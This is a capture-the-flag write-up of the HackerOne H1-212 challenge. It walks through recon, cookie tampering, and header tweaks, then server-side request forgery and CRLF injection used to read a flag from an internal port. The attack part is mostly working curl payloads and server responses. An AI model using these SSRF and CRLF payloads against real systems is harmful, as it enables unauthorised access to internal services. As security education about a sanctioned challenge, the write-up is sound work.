_The following writeup can also be found on [ysx.me.uk](https://ysx.me.uk/h1-212-capturing-the-hackerone-challenge-flag/)._

# H1-212: capturing the HackerOne challenge flag

Late in the afternoon of November 13th did HackerOne [announce](https://www.hackerone.com/blog/hack-your-way-to-nyc-this-december-for-h1-212) their next live hacking event: **H1-212**, set to take place in New York City this December. Having never attended an in-person event, nor taken part in any challenges besides Google's annual qualifier, I felt this was an excellent opportunity to apply myself to the H1-212 CTF.    

And so, I promptly started reviewing the challenge brief:

> An engineer of acme.org launched a new server for a new admin panel at **http://104.236.20.43**. He is completely confident that the server can’t be hacked. He added a tripwire that notifies him when the flag file is read. He also noticed that the default Apache page is still there, but according to him that’s intentional and doesn’t hurt anyone. Your goal? Read the flag!

Many setbacks were encountered over the hours which followed, but with every step further came a new technique learned, eventually leading to the flag-bearing request. Let's begin.

## 🔎 Part one: reconnaissance and redirection

### Exploring the Acme server

Intercept proxy and text editor at the ready, I commenced my initial reconnaissance of `http://104.236.20.43` (herein referred to as the Acme server). This took the form of a standard Nmap scan with service enumeration parameters:

```
$ nmap -T4 -A -v 104.236.20.43
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

![Running an Nmap scan](https://user-images.githubusercontent.com/4115778/32795570-02616e3a-c964-11e7-9d31-c65e5ecaa5b0.png)

Of the two services that were identified, I first turned my attention to OpenSSH, which in this case allowed for both password and key-based authentication. After thorough examination, it became clear that a foothold for access could not be reached, and so I proceeded to examine the Apache web server.

Manually browsing to the host confirmed what was referenced in the CTF brief: presence of the Apache default page.

![The Apache default page](https://user-images.githubusercontent.com/4115778/32795571-027edace-c964-11e7-88ad-55b04b9b42eb.png)

Several hours passed as I searched for misconfigurations, reviewed the default page source code, and even thought of searching for steganographic text within the Ubuntu logo, all to no avail.

### Mapping a subdomain
Stepping away from the command line for a moment and returning to the brief was the catalyst for my first breakthrough. The server was assigned to the "new admin panel" of an engineer from `acme.org` &mdash; so I decided to map the Acme server to a likely subdomain in my `/etc/hosts` file: `admin.acme.org`.

```
$ echo "104.236.20.43   admin.acme.org" >> /etc/hosts
```

Browsing to `admin.acme.org` provided me with a small indication that I was on the right track.

```
$ curl -i "http://admin.acme.org"
```

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 16:35:19 GMT
Server: Apache/2.4.18 (Ubuntu)
Set-Cookie: admin=no
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

Given that cookie manipulation often serves as a useful way to escalate one's privileges, the `admin=no` cookie returned in the response header meant there was potential scope for progression, as [explained](https://cwe.mitre.org/data/definitions/565.html) by MITRE:

> "Attackers can easily modify cookies within the browser [...] reliance on cookies without integrity checking can allow attackers to bypass authentication [...]"

## 🍪 Part two: headers, cookies, and JSON

By this point, roughly twelve hours had passed since the CTF opened; I was amazed to [learn](https://twitter.com/jobertabma/status/930273559946989569) that over thirty million requests were sent to the Acme server during that timeframe. 

I was occupied with attempting to manipulate host headers (as explored in James Kettle's *[Cracking the Lens](http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html)* investigation) and modifying request content types &mdash; in essence, lots of header manipulation. With each request POSTed to `admin.acme.org/index.php` was a `406 Not Acceptable` error code returned. 

### Request headers

Reading from the MDN [documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/406):

> The HTTP 406 Not Acceptable client error response code indicates that a response matching the list of acceptable values defined in `Accept-Charset` and `Accept-Language` cannot be served.

This led me to isolate three request headers for further analysis:

* `Accept-Language` &mdash; presents which languages the client understands
* `Accept-Charset` &mdash; presents which character set the client understands
* `Content-Type` &mdash; requests the desired resource MIME type from the server

Given that API-based authentication often leverages JSON payloads, I constructed a POST request to `/index.php` with the administrator cookie, an `iso-8859-1` character set, and the `application/json` MIME type:

```
$ curl -i -s -k -X "POST" -H$'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -b $'admin=yes' 'http://admin.acme.org/index.php'
```

This time, the response was humorously intriguing:

```
HTTP/1.1 418 I'm a teapot
Date: Tue, 14 Nov 2017 16:52:28 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 37
Content-Type: application/json

{"error":{"body":"unable to decode"}}
```

HTTP status code `418` is sourced from a Request for Comments [memo](https://tools.ietf.org/html/rfc2324) issued by the [IETF](https://www.ietf.org) on April Fools' Day of 1998, for the "Hyper Text Coffee Pot Control Protocol."

### Diving into the JSON

The challenge was afoot. Thinking to improvise, I constructed an authentication-style JSON payload and POSTed it to the Acme server:

```
$ curl -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' --data-binary $'{\"username\":\"admin\",\"password\":\"admin\"}' 'http://admin.acme.org/index.php'
```

```
HTTP/1.1 418 I'm a teapot
Date: Tue, 14 Nov 2017 16:57:51 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 31
Content-Type: application/json

{"error":{"domain":"required"}}
```
  
Using that newfound information, I swapped the `username` and `password` key-value pairs in favour of a `domain` pair, within which I specified `www.google.com` as the value:

```
$ curl -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' --data-binary $'{\"domain\":\"www.google.com\"}' 'http://admin.acme.org/index.php'
```

```
HTTP/1.1 418 I'm a teapot
Date: Tue, 14 Nov 2017 17:07:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 69
Content-Type: application/json

{"error":{"domain":"incorrect value, sub domain should contain 212"}}
```
The Acme server was configured to request a subdomain containing `212` (in reference to the H1-212 competition). After supplying one, in the form of a `212.google.com` value, the plot started to thicken. 

```
$ curl -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' --data-binary $'{\"domain\":\"212.google.com\"}' 'http://admin.acme.org/index.php'
```

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 17:08:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 27
Content-Type: text/html; charset=UTF-8

{"next":"\/read.php?id=0"}
```

### The "next" step

I decided to first access `read.php` through a basic GET request, in hope of discovering another pertinent clue:

```
$ curl -i -s -k -X $'GET' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' 'http://admin.acme.org/read.php'
```

```
HTTP/1.1 418 I'm a teapot
Date: Tue, 14 Nov 2017 17:11:11 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 51
Content-Type: application/json

{"error":{"row":"incorrect type, number expected"}}
```

It became evident that data was being passed from `index.php` to `read.php` by way of the `id` value. Supplying an ID of `0` via query-string parameter led to a new JSON response: containing a blank `data` key-value pair:

```
$ curl -i -s -k -X $'GET' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' 'http://admin.acme.org/read.php?id=0'
```

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 17:13:13 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 11
Content-Type: text/html; charset=UTF-8

{"data":""}
```

Further iterations of this request-response sequence led me to conclude that the `id` value incremented after every valid POST to `index.php` &mdash; with the URL initialised within a `read.php` function, behind the scenes.

## 🛂 Part three: forging internal requests

It eventually became apparent that [server-side request forgery](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF) (SSRF) might be the key to unlocking a `data` JSON response, [described](https://cwe.mitre.org/data/definitions/918.html) by MITRE as follows:

> By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly.

As part of my preliminary investigation into potential SSRF vectors, I spun up a new domain (`appsec-testdomain.com`) and mapped the nameservers to CloudFlare for DNS handling. After propagation had completed, I configured a new `A` record, mapping `127.0.0.1` to `212.com.appsec-testdomain.com` without proxying through CloudFlare's servers:

![CloudFlare record assignment](https://user-images.githubusercontent.com/4115778/32795568-0234c1e6-c964-11e7-8c5f-c5ac4214ba77.png)

The next request-response sequence returned a `data` value full of Base64-encoded text.

```
$ curl -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' --data-binary $'{\"domain\":\"212.com.appsec-testdomain.com\"}' 'http://admin.acme.org/index.php'
```

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 17:23:29 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 27
Content-Type: text/html; charset=UTF-8

{"next":"\/read.php?id=91"}
```

Decoding this text identified the contents as Apache's default web server page:

```
$ curl -i -s -k -X $'GET' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' 'http://admin.acme.org/read.php?id=91'
```

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 17:23:46 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
 
{"data":"<base64 removed due to length>"}
```

## ⌨️ Part four: carriage return, line feed

Given that the Acme server prevented the use of various characters used in SSRF payloads, such as the fragment identifier (`#`) and query-string marker (`?`), leveraging an external domain seemed like an ideal solution for reading the flag. Having no such look, I decided to examine the `localhost` (127.0.0.1) context in greater depth.

Orange Tsai's excellent talk on [exploiting URL parsers](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/DEFCON-25-Orange-Tsai-A-New-Era-of-SSRF-Exploiting-URL-Parser-in-Trending-Programming-Languages.pdf) inspired me to experiment with some more esoteric SSRF payloads, chaining them with CRLF injection techniques in various unsuccessful attempts to bypass the Acme filter.

After several hours, I started to consider whether the flag was being served from an alternate port on the Acme server, so introduced a `localhost:<port>` string and tested a variety of likely ports. Thinking back to the nature of the challenge, I came across a web server on port `1337` &mdash; this was it. It felt like the flag was coming within reach. 

```
$ curl -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' --data-binary $'{\"domain\":\"localhost:1337@212.google.com\"}' $'http://admin.acme.org/index.php/'
```

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 17:35:21 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 43
Content-Type: text/html; charset=UTF-8

{"data":"SG1tLCB3aGVyZSB3b3VsZCBpdCBiZT8K"}
```

When decoded, the above Base64 string reads: `Hmm, where would it be?`.

## 🏁 Part five: capturing the flag

Some interesting behaviour surfaced whilst refining my search for the flag: the following request increments the `id` counter by a count of three:

```
$ curl -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/json' -H $'Accept-Charset: iso-8859-1' -H $'Upgrade-Insecure-Requests: 1' -b $'admin=yes' --data-binary $'{\"domain\":\"localhost:1337/flag\\n\\n\\r\\r212.google.com\"}' $'http://admin.acme.org/index.php/'
```
Checking the preceding `id` values led me to notice that *subtracting two* from the returned ID would return Base64-encoded data, rather than a blank key-value pair. For instance, if the above request returned an `id` of 105, the Base64 would be returned in `id` 103. Upon checking the resultant ID value, the following Base64 response was returned:

```
HTTP/1.1 200 OK
Date: Tue, 14 Nov 2017 17:39:50 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 191
Content-Type: text/html; charset=UTF-8

{"data":"RkxBRzogQ0YsMmRzVlwvXWZSQVlRLlRERXBgdyJNKCVtVTtwOSs5RkR7WjQ4WCpKdHR7JXZTKCRnN1xTKTpmJT1QW1lAbmthPTx0cWhuRjxhcT1LNTpCQ0BTYip7WyV6IitAeVBiL25mRm5hPGUkaHZ7cDhyMlt2TU1GNTJ5OnovRGg7ezYK"}
```

And finally, decoding the above Base64 payload revealed the plaintext `FLAG` value. CTF complete.

```
FLAG: CF,2dsV\/]fRAYQ.TDEp`w"M(%mU;p9+9FD{Z48X*Jtt{%vS($g7\S):f%=P[Y@nka=<tqhnF<aq=K5:BC@Sb*{[%z"+@yPb/nfFna<e$hv{p8r2[vMMF52y:z/Dh;{6
```


## 🎉 Conclusion

Requests made during the course of this writeup were issued several hours after first decoding the final `FLAG` value, as part of the confirmation process.

Gaining the OSCP designation last month underscored the importance of determination and resilience, above all else. The drive to *try harder*, combined with the support of the HackerOne community, motivated me to follow through in completing this challenge and continues to do so today.

Finally, I would like to once again thank Jobert Abma and the HackerOne team for producing a highly enjoyable Capture The Flag experience.
